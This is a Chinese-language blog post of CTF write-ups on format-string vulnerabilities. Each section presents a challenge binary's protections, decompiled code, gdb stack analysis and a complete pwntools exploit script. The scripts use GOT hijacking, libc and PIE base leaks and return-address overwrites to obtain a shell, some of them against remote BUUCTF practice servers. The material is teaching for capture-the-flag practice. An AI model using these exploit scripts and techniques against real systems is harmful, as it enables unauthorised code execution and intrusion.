<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>格式化字符串漏洞题目练习 ~ Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期日, 三月 15日 2020, 2:38 下午
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    7k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      35 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p>
<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-10Ch]
  unsigned int v4; // [esp+10Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  do
  {
    fgets(&amp;s, 256, stdin);
    printf(&amp;s);
  }
  while ( strcmp(&amp;s, &quot;exit\n&quot;) );
  system(&quot;echo Goodbye&quot;);
  exit(0);
}</code></pre>
<p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p>
<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x20
0000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)
0004| 0xffffd254 --&gt; 0x100
0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b
0012| 0xffffd25c --&gt; 0x0
0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40
0020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)
0024| 0xffffd268 --&gt; 0xf63d4e2e
0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26c
The index of format argument : 7 (&quot;\%6$p&quot;)</code></pre>
<p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = process(&#39;./echo&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,26990)
system_plt = 0x08048400
printf_got = 0x0804A010

def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result

prev = 0 
payload = &quot;&quot;
key = 0x08048400
for i in range(2):
    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff

payload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.send(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p>
<pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = process(&#39;./echo&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,26990)
system_plt = 0x08048400
printf_got = 0x0804A010
payload = fmtstr_payload(7,{printf_got : system_plt})
io.sendline(payload)
io.send(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<pre><code class="c">[DEBUG] Sent 0x3c bytes:
    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  │····│····│····│····│
    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  │%240│c%7$│hhn%│132c│
    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  │%8$h│hn%1│28c%│9$hh│
    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               │n%4c│%10$│hhn·││
    0000003c</code></pre>
<p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p>
<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+2Ch] [ebp-5Ch]
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(&amp;buf, 0, 0x50u);
  read(0, &amp;buf, 0x50u);
  printf(&amp;buf);
  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);
  if ( *(_DWORD *)&amp;x != 4 )
    return 0;
  puts(&quot;running sh...&quot;);
  system(&quot;/bin/sh&quot;);
  return 0;
}</code></pre>
<p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
# io = process(&#39;./fm&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,26915)
# io.recv()
payload = p32(0x0804A02C) + &#39;%11$hn&#39;
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.interactive()</code></pre>
<h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code class="c">#include &lt;stdio.h&gt;

int main() {
    setvbuf(stdout, 0, _IONBF, 0);
    alarm(180);
    char str[100];
    while(gets(str)) {
        printf(str);
    }
    return 0;
}</code></pre>
<p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
import time
context.arch = &#39;amd64&#39;
context.log_level = &#39;debug&#39;
io = process(&#39;./fmt1&#39;)
elf = ELF(&#39;./fmt1&#39;)
libc = elf.libc
printf_got = 0x0000601020
io.sendline(&#39;%21$p&#39;)
io.recvuntil(&#39;0x&#39;)
libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
print(&#39;leak_libc_base: &#39; + hex(libc_base))
print(&#39;system_addr: &#39; + hex(system_addr))
def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
prev = 0 
payload = &quot;&quot;
key = system_addr
for i in range(3):
    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff

payload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)
io.sendline(payload)
sleep(1)
io.sendline(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;

int magic = 0 ;

int main(){
    char buf[0x100];
    setvbuf(stdout,0,2,0);
    puts(&quot;Please crax me !&quot;);
    printf(&quot;Give me magic :&quot;);
    read(0,buf,0x100);
    printf(buf);
    if(magic == 0xda){
        system(&quot;cat /home/craxme/flag&quot;);
    }else if(magic == 0xfaceb00c){
        system(&quot;cat /home/craxme/craxflag&quot;);
    }else{
        puts(&quot;You need be a phd&quot;);
    }

}</code></pre>
<p>编译为64位。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;
io = process(&#39;./craxme&#39;)
# io = remote(&#39;127.0.0.1&#39;,8888)
magic = 0x0000060106C
io.recvuntil(&#39;:&#39;)
system_plt = 0x04005A0
puts_got = 0x0601018
ret_addr = 0x00400747
printf_got = 0x00601030
key = 0x00400747
key2 = 0x04005A0
def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
prev = 0 
payload = &quot;&quot;

for i in range(3):
    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff
for i in range(3):
    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i) 
    prev = (key2 &gt;&gt; i*16) &amp; 0xffff
payload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])

io.sendline(payload)
io.interactive()</code></pre>
<h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre>
<h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p>
<pre><code class="c">char *__cdecl ask_username(char *dest)
{
  char src[40]; // [esp+14h] [ebp-34h]
  int i; // [esp+3Ch] [ebp-Ch]

  puts(&quot;Connected to ftp.hacker.server&quot;);
  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);
  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);
  __isoc99_scanf(&quot;%40s&quot;, src);
  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )
    ++src[i];
  return strcpy(dest, src);
}</code></pre>
<p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p>
<pre><code class="c">int __cdecl ask_password(char *s1)
{
  if ( !strcmp(s1, &quot;sysbdmin&quot;) )
    return puts(&quot;welcome!&quot;);
  puts(&quot;who you are?&quot;);
  exit(1);
  return puts(&quot;welcome!&quot;);
}</code></pre>
<p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p>
<pre><code class="c">int get_file()
{
  char dest; // [esp+1Ch] [ebp-FCh]
  char s1; // [esp+E4h] [ebp-34h]
  char *i; // [esp+10Ch] [ebp-Ch]

  printf(&quot;enter the file name you want to get:&quot;);
  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);
  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )
    puts(&quot;too young, too simple&quot;);
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &amp;s1) )
    {
      strcpy(&amp;dest, i + 40);
      return printf(&amp;dest);
    }
  }
  return printf(&amp;dest);
}</code></pre>
<p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p>
<ul>
<li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li>
<li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li>
</ul>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
io = process(&#39;./pwn3&#39;)
elf = ELF(&#39;./pwn3&#39;)
libc = elf.libc
s = &#39;sysbdmin&#39;
key = &#39;&#39;
for i in s:
    key+=chr(ord(i)-1)
print(key)
io.sendline(key)
info(&#39;---------leak libc_base--------&#39;)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;put&#39;)
io.recvuntil(&#39;upload:&#39;)
io.sendline(&#39;1111&#39;)
puts_got = elf.got[&#39;puts&#39;]
io.sendline(&#39;%8$s&#39; + p32(puts_got) )
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;get&#39;)
io.recvuntil(&#39;get:&#39;)
io.sendline(&#39;1111&#39;)
puts_addr = u32(io.recv(4)[:4])
print(&#39;puts_add:&#39; + hex(puts_addr))
sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]
io.recvuntil(&#39;&gt;&#39;)
info(&#39;---------hijack puts_got--------&#39;)
io.sendline(&#39;put&#39;)
io.recvuntil(&#39;upload:&#39;)
io.sendline(&#39;/bin/sh;&#39;)
payload = fmtstr_payload(7,{puts_got: sys_addr})
io.sendline(payload)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;get&#39;)
io.recvuntil(&#39;get:&#39;)
info(&#39;--------- get shell-------&#39;)
io.sendline(&#39;/bin/sh;&#39;)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;dir&#39;)
io.interactive()</code></pre>
<h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre>
<p>开启了RELRO，这样就无法修改got了。</p>
<h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p>
<pre><code class="c">
int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)
{
  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);
  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);
  return printf(&amp;a9 + 4);
}
</code></pre>
<p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p>
<p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;
io = process(&#39;./pwnme_k0&#39;)
# context.clear(arch = &#39;amd64&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(&#39;%0006$lx&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(&#39;11111111&#39;)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;1&#39;)
# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)
stack = int(io.recvline_contains(&#39;7f&#39;),16)
print(stack)
ret_add = stack - 0x38
# system_add = 0x04008AA
payload = &#39;%2218c%8$hn&#39;
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;2&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(p64(ret_add))
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(payload)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;1&#39;)
io.interactive()</code></pre>
<h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p>
<h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn echo()
{
  char s; // [rsp+0h] [rbp-110h]
  unsigned __int64 v1; // [rsp+108h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  do
  {
    fgets(&amp;s, 256, stdin);
    printf(&amp;s, 256LL);
  }
  while ( strcmp(&amp;s, &quot;exit\n&quot;) );
  system(&quot;echo Goodbye&quot;);
  exit(0);
}</code></pre>
<p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p>
<h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;
   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]
   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94
   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax
   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre>
<p>找到关键点，然后看一下栈情况：</p>
<pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087
--More--(25/48)
0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)
0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087
0216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)
0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)
0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)
0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre>
<p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;
io = process(&#39;./echo2&#39;)
# io = remote(&#39;node3.buuoj.cn&#39;,28200)
def leak1():
    io.sendline(&#39;%34$p&#39;)
    io.recvuntil(&#39;0x&#39;)
    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)
    return p_bass_addr
p_bass_addr = leak1()
print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))
print_got = 0x201020 + p_bass_addr
print(&#39;print_got -&gt;&#39; + hex(print_got))
system_plt = 0x790 + p_bass_addr
print(&#39;system_plt -&gt;&#39; + hex(system_plt))

def fmt(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
prev = 0 
payload = &quot;&quot;
key = system_plt
for i in range(3):
    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff
payload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])
# raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
sleep(0.1)
io.sendline(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<p>-—  </p>
<p>** 接下来的题，都是buf不再栈的上的题目。**</p>
<h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p>
<h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax

  while ( 1 )
  {
    result = (int)fgets(buf, 1024, stdin);
    if ( !result )
      break;
    echo();
  }
  return result;
}</code></pre>
<p>漏洞函数：</p>
<pre><code class="c">int make_response()
{
  return snprintf(response, 0x400u, buf);
}</code></pre>
<p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p>
<h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="html">gdb-peda$ stack 0x20
0000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x0
0004| 0xffffd324 --&gt; 0x400
0008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)
0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f
0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)
0020| 0xffffd334 --&gt; 0x0
0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0
0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)
</code></pre>
<p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p>
<pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre>
<p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p>
<pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)
0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)
</code></pre>
<p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p>
<p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p>
